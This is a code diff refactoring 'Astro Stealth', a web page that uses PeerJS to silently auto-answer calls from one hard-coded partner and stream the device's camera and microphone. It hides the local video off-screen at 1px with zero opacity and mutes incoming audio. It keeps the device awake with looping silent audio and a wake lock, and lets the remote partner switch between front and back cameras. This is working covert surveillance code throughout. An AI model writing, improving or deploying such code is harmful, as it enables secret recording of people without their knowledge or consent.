@@ -3,35 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Stealth - Switchable Camera</title>
+    <title>Astro Stealth</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: transparent;
-            min-height: 0;
-            padding: 0;
-            margin: 0;
-            overflow: hidden;
-        }
+        body { background: transparent; overflow: hidden; }
         video {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-            top: -1000px;
-            left: -1000px;
+            position: absolute; width: 1px; height: 1px;
+            opacity: 0; pointer-events: none;
+            top: -9999px; left: -9999px;
         }
     </style>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
 <body>
     <video id="localVideo" autoplay muted playsinline></video>
-
     <script>
         const MY_ID = "BPrivate";
         const PARTNER_ID = "APrivate";
-        
+
         let peer = null;
         let currentCall = null;
         let localStream = null;
@@ -40,286 +29,219 @@
         let wakeLock = null;
         let reconnectAttempts = 0;
         const MAX_RECONNECTS = 5;
-        
-        function log(msg) {
-            console.log(`[STEALTH] ${msg}`);
-        }
 
-        // ── Get a media stream for the requested camera ──────────────────────
-        async function getStream(isVideo, camera) {
-            const facingMode = camera === "back" ? "environment" : "user";
+        function log(msg) { console.log(`[STEALTH] ${msg}`); }
+
+        // ── Get stream for a specific camera (camera arg is explicit, never reads global) ──
+        async function getStreamForCamera(camera, isVideo) {
+            // camera is passed in directly — never read from global currentCamera
+            const facingMode = (camera === "back") ? "environment" : "user";
+            log(`getStreamForCamera: camera=${camera} facingMode=${facingMode} isVideo=${isVideo}`);
 
             if (!isVideo) {
                 return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
             }
 
-            // Strategy 1: exact facingMode — most reliable on real mobile hardware
+            // Try 1: exact facingMode
             try {
                 const s = await navigator.mediaDevices.getUserMedia({
                     audio: true,
-                    video: { facingMode: { exact: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
+                    video: { facingMode: { exact: facingMode } }
                 });
-                log(`Stream OK via exact facingMode=${facingMode}`);
+                const gotFacing = s.getVideoTracks()[0]?.getSettings()?.facingMode;
+                log(`Try1 OK: got facingMode=${gotFacing}`);
                 return s;
             } catch (e) {
-                log(`exact facingMode failed (${e.name}), trying deviceId enumeration`);
+                log(`Try1 failed (${e.name}): ${e.message}`);
             }
 
-            // Strategy 2: pick deviceId by label / index
+            // Try 2: enumerate devices, pick by label then by index
             try {
-                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                tempStream.getTracks().forEach(t => t.stop());
+                // Need a temporary permission grant so labels are populated
+                const tmp = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                tmp.getTracks().forEach(t => t.stop());
 
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cams = devices.filter(d => d.kind === "videoinput");
-                log(`Cameras: ${cams.map((c, i) => `[${i}] ${c.label || '?'}`).join(', ')}`);
+                const all = await navigator.mediaDevices.enumerateDevices();
+                const cams = all.filter(d => d.kind === "videoinput");
+                log(`Try2: found ${cams.length} cameras: ${cams.map((c,i)=>`[${i}]${c.label||'?'}`).join(', ')}`);
 
                 let deviceId = null;
-                const backKw  = ['back', 'rear', 'environment', 'main'];
-                const frontKw = ['front', 'face', 'selfie', 'user'];
-                const keywords = camera === "back" ? backKw : frontKw;
 
-                for (const cam of cams) {
-                    if (keywords.some(k => cam.label.toLowerCase().includes(k))) {
-                        deviceId = cam.deviceId;
-                        log(`Label match → ${cam.label}`);
-                        break;
+                // Label matching
+                for (const c of cams) {
+                    const lbl = c.label.toLowerCase();
+                    if (camera === "back"  && (lbl.includes("back") || lbl.includes("rear") || lbl.includes("environment"))) {
+                        deviceId = c.deviceId; log(`Try2 label match back: ${c.label}`); break;
+                    }
+                    if (camera === "front" && (lbl.includes("front") || lbl.includes("face") || lbl.includes("user") || lbl.includes("selfie"))) {
+                        deviceId = c.deviceId; log(`Try2 label match front: ${c.label}`); break;
                     }
                 }
 
-                // Index fallback: front=first, back=last
+                // Index fallback
                 if (!deviceId && cams.length >= 2) {
-                    deviceId = camera === "back" ? cams[cams.length - 1].deviceId : cams[0].deviceId;
-                    log(`Index fallback → ${camera === "back" ? "last" : "first"} device`);
+                    deviceId = (camera === "back") ? cams[cams.length - 1].deviceId : cams[0].deviceId;
+                    log(`Try2 index fallback: ${camera === "back" ? "last" : "first"}`);
                 }
 
                 if (deviceId) {
                     const s = await navigator.mediaDevices.getUserMedia({
                         audio: true,
-                        video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 480 } }
+                        video: { deviceId: { exact: deviceId } }
                     });
-                    log(`Stream OK via deviceId`);
+                    log(`Try2 OK via deviceId`);
                     return s;
                 }
             } catch (e) {
-                log(`deviceId strategy failed: ${e.message}`);
+                log(`Try2 failed: ${e.message}`);
             }
 
-            // Strategy 3: ideal facingMode (last resort)
-            log(`Falling back to ideal facingMode=${facingMode}`);
+            // Try 3: ideal facingMode (may silently fall back to front — last resort)
+            log(`Try3: ideal facingMode=${facingMode}`);
             return navigator.mediaDevices.getUserMedia({
                 audio: true,
-                video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
+                video: { facingMode: { ideal: facingMode } }
             });
         }
 
-        // ── Wait until peerConnection has live senders (max ~3s) ─────────────
-        function waitForSenders(call, timeout = 3000) {
-            return new Promise((resolve, reject) => {
-                const start = Date.now();
-                const check = () => {
-                    const pc = call.peerConnection;
-                    if (pc) {
-                        const senders = pc.getSenders().filter(s => s.track);
-                        if (senders.length > 0) { resolve(senders); return; }
-                    }
-                    if (Date.now() - start > timeout) {
-                        reject(new Error('Timed out waiting for senders'));
-                    } else {
-                        setTimeout(check, 100);
-                    }
-                };
-                check();
-            });
-        }
-
-        // ── Switch camera during a live video call ────────────────────────────
+        // ── Camera switch during a live call ──────────────────────────────────
         async function switchCamera(targetCamera) {
-            if (targetCamera === currentCamera) { log(`Already on ${targetCamera}`); return; }
-            log(`Switch: ${currentCamera} → ${targetCamera}`);
+            log(`switchCamera called: ${currentCamera} → ${targetCamera}`);
 
-            if (!currentCall) {
-                currentCamera = targetCamera;
-                log("No active call; preference saved"); return;
+            if (targetCamera === currentCamera) { log("Already on this camera"); return; }
+            if (!currentCall) { currentCamera = targetCamera; log("No call; saved preference"); return; }
+            if ((currentCall.metadata?.type || "voice") !== "video") {
+                currentCamera = targetCamera; log("Audio-only; saved preference"); return;
             }
 
-            const isVideo = (currentCall.metadata?.type || 'voice') === 'video';
-            if (!isVideo) { currentCamera = targetCamera; log("Audio-only; preference saved"); return; }
-
             try {
-                // 1. Get new stream FIRST — don't stop old stream yet (senders need live tracks)
-                const newStream = await getStream(true, targetCamera);
-                log(`New stream acquired for ${targetCamera}`);
+                // Step 1: get new stream (pass targetCamera explicitly)
+                log(`Acquiring stream for targetCamera=${targetCamera}...`);
+                const newStream = await getStreamForCamera(targetCamera, true);
+                log(`New stream tracks: video=${newStream.getVideoTracks().length} audio=${newStream.getAudioTracks().length}`);
 
-                // 2. Wait for peerConnection senders to be ready
-                let senders;
-                try {
-                    senders = await waitForSenders(currentCall);
-                } catch (e) {
-                    log(`⚠️ ${e.message} — trying getSenders() directly`);
-                    senders = currentCall.peerConnection?.getSenders() || [];
+                // Step 2: get senders — poll until ICE is done (up to 4s)
+                const pc = currentCall.peerConnection;
+                if (!pc) { log("No peerConnection"); return; }
+
+                let senders = [];
+                for (let i = 0; i < 40; i++) {
+                    senders = pc.getSenders().filter(s => s.track);
+                    if (senders.length >= 2) break;
+                    await new Promise(r => setTimeout(r, 100));
                 }
-                log(`Senders: ${senders.map(s => s.track?.kind).join(', ')}`);
+                log(`Senders: ${senders.map(s => s.track.kind).join(", ")}`);
 
-                const vSender = senders.find(s => s.track?.kind === 'video');
-                const aSender = senders.find(s => s.track?.kind === 'audio');
+                // Step 3: replaceTrack
+                const vSender = senders.find(s => s.track.kind === "video");
+                const aSender = senders.find(s => s.track.kind === "audio");
 
-                if (vSender && newStream.getVideoTracks()[0]) {
-                    await vSender.replaceTrack(newStream.getVideoTracks()[0]);
-                    log(`✅ Video track replaced → ${targetCamera}`);
+                if (vSender) {
+                    const newVTrack = newStream.getVideoTracks()[0];
+                    await vSender.replaceTrack(newVTrack);
+                    log(`✅ replaceTrack(video) done — ${targetCamera}`);
                 } else {
-                    log(`⚠️ No video sender found (total senders: ${senders.length})`);
+                    log("⚠️ No video sender found");
                 }
-                if (aSender && newStream.getAudioTracks()[0]) {
-                    await aSender.replaceTrack(newStream.getAudioTracks()[0]);
-                    log(`✅ Audio track replaced`);
+                if (aSender) {
+                    const newATrack = newStream.getAudioTracks()[0];
+                    if (newATrack) await aSender.replaceTrack(newATrack);
                 }
 
-                // 3. NOW safe to stop the old stream
+                // Step 4: stop OLD stream only after replaceTrack succeeds
                 if (localStream) {
-                    localStream.getTracks().forEach(t => t.stop());
-                    log(`Old ${currentCamera} stream stopped`);
+                    localStream.getTracks().forEach(t => { t.stop(); log(`Stopped old ${t.kind} track`); });
                 }
 
                 localStream = newStream;
-                currentCamera = targetCamera;
-                document.getElementById('localVideo').srcObject = newStream;
+                currentCamera = targetCamera;  // ← only set AFTER everything succeeds
+                document.getElementById("localVideo").srcObject = newStream;
 
-                if (dataConn?.open) dataConn.send({ type: 'camera_switched', camera: targetCamera });
-                log(`✅ Camera switch complete: ${targetCamera}`);
+                if (dataConn?.open) dataConn.send({ type: "camera_switched", camera: targetCamera });
+                log(`✅ Camera switch complete → ${targetCamera}`);
 
             } catch (err) {
-                log(`❌ Switch failed: ${err.message}`);
-                // currentCamera unchanged on failure
+                log(`❌ switchCamera failed: ${err.name}: ${err.message}`);
             }
         }
 
-        async function preventScreenLock() {
-            if ('wakeLock' in navigator) {
-                try {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    log('Screen wake lock acquired');
-                } catch (err) {}
-            }
-            const silentAudio = new Audio();
-            silentAudio.src = 'data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
-            silentAudio.loop = true;
-            silentAudio.volume = 0;
-            silentAudio.play().catch(() => {});
-        }
-
+        // ── Handle incoming call ──────────────────────────────────────────────
         async function handleIncomingCall(call) {
-            const callType = call.metadata?.type || 'voice';
-            const isVideo = callType === 'video';
-            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call`);
-
+            const isVideo = (call.metadata?.type || "voice") === "video";
+            log(`Incoming ${isVideo ? "VIDEO" : "AUDIO"} call`);
             try {
                 currentCamera = "front";
-                const stream = await getStream(isVideo, currentCamera);
+                const stream = await getStreamForCamera("front", isVideo);
                 localStream = stream;
-
-                if (isVideo && stream.getVideoTracks().length > 0) {
-                    document.getElementById('localVideo').srcObject = stream;
-                }
+                if (isVideo) document.getElementById("localVideo").srcObject = stream;
 
                 call.answer(stream);
                 currentCall = call;
-                log(`Call answered — ${isVideo ? 'Video+Audio' : 'Audio'} from ${currentCamera} cam`);
+                log(`Answered — ${isVideo ? "video+audio" : "audio"} from front cam`);
 
-                // Log sender count once ICE connects — helps debug switchCamera issues
-                if (isVideo) {
-                    waitForSenders(call).then(senders => {
-                        log(`📡 Senders ready: ${senders.map(s => s.track.kind).join(', ')} — camera switch will work`);
-                    }).catch(e => {
-                        log(`⚠️ Senders not ready: ${e.message}`);
-                    });
-                }
-
-                call.on('stream', rs => rs?.getTracks().forEach(t => { t.enabled = false; }));
-                call.on('close', () => { log('Call ended by remote'); endCall(); });
-                call.on('error', e => { log(`Call error: ${e}`); endCall(); });
-
+                call.on("stream", rs => rs?.getTracks().forEach(t => t.enabled = false));
+                call.on("close", () => { log("Call closed"); endCall(); });
+                call.on("error", e => { log(`Call error: ${e}`); endCall(); });
             } catch (err) {
-                log(`Failed to answer call: ${err.message}`);
+                log(`Answer failed: ${err.message}`);
                 call.close();
             }
         }
 
-        function handleDataMessage(data) {
-            log(`Data received: ${JSON.stringify(data)}`);
-            if (data.type === 'switchCamera') {
+        function handleData(data) {
+            log(`Data: type=${data.type}`);
+            if (data.type === "switchCamera") {
                 switchCamera(data.camera);
-            } else if (data.type === 'ping') {
-                if (dataConn?.open) dataConn.send({ type: 'pong', timestamp: Date.now() });
+            } else if (data.type === "ping" && dataConn?.open) {
+                dataConn.send({ type: "pong", timestamp: Date.now() });
             }
         }
 
         function endCall() {
-            if (localStream) {
-                localStream.getTracks().forEach(t => t.stop());
-                localStream = null;
-            }
-            if (currentCall) { currentCall.close(); currentCall = null; }
-            document.getElementById('localVideo').srcObject = null;
-            log('Call ended, resources released');
+            localStream?.getTracks().forEach(t => t.stop());
+            localStream = null;
+            currentCall?.close();
+            currentCall = null;
+            document.getElementById("localVideo").srcObject = null;
+            log("Call ended");
+        }
+
+        async function preventSleep() {
+            try { wakeLock = await navigator.wakeLock?.request("screen"); } catch (_) {}
+            const a = new Audio();
+            a.src = "data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+            a.loop = true; a.volume = 0; a.play().catch(() => {});
         }
 
         function initPeer() {
-            if (peer) { peer.destroy(); peer = null; }
-            log(`Initializing as ${MY_ID}`);
+            peer?.destroy();
             peer = new Peer(MY_ID);
-
-            peer.on('open', () => {
-                log(`✅ Stealth ACTIVE — waiting for ${PARTNER_ID}`);
-                reconnectAttempts = 0;
+            peer.on("open", () => { log(`✅ Active as ${MY_ID}`); reconnectAttempts = 0; });
+            peer.on("connection", c => {
+                if (c.peer !== PARTNER_ID) { c.close(); return; }
+                log("Data channel open");
+                dataConn = c;
+                c.on("data", handleData);
+                c.on("close", () => { dataConn = null; });
             });
-
-            peer.on('connection', (conn) => {
-                if (conn.peer !== PARTNER_ID) { conn.close(); return; }
-                log('Data connection from remote');
-                dataConn = conn;
-                conn.on('data', handleDataMessage);
-                conn.on('close', () => { log('Data conn closed'); dataConn = null; });
-            });
-
-            peer.on('call', (call) => {
+            peer.on("call", call => {
                 if (call.peer === PARTNER_ID) handleIncomingCall(call);
-                else { log(`Rejected call from ${call.peer}`); call.close(); }
+                else call.close();
             });
-
-            peer.on('disconnected', () => {
-                if (reconnectAttempts < MAX_RECONNECTS) {
-                    reconnectAttempts++;
-                    setTimeout(() => peer.reconnect(), 3000);
-                }
+            peer.on("disconnected", () => {
+                if (reconnectAttempts++ < MAX_RECONNECTS) setTimeout(() => peer.reconnect(), 3000);
             });
-
-            peer.on('error', (err) => {
-                if (err.type === 'unavailable-id') setTimeout(() => initPeer(), 5000);
+            peer.on("error", err => {
+                if (err.type === "unavailable-id") setTimeout(initPeer, 5000);
                 else log(`Peer error: ${err.type}`);
             });
         }
 
-        async function listCameras() {
-            try {
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(d => d.kind === 'videoinput');
-                log(`📷 ${cameras.length} camera(s) found:`);
-                cameras.forEach((c, i) => log(`  [${i}] ${c.label || 'Unnamed'} — ${c.deviceId.substring(0, 20)}...`));
-            } catch (e) {
-                log(`Camera list error: ${e.message}`);
-            }
-        }
-
-        preventScreenLock();
-        setTimeout(listCameras, 1000);
+        preventSleep();
         initPeer();
 
-        window.addEventListener('beforeunload', () => {
-            endCall();
-            if (peer) peer.destroy();
-            if (wakeLock) wakeLock.release();
+        window.addEventListener("beforeunload", () => {
+            endCall(); peer?.destroy(); wakeLock?.release();
         });
     </script>
 </body>
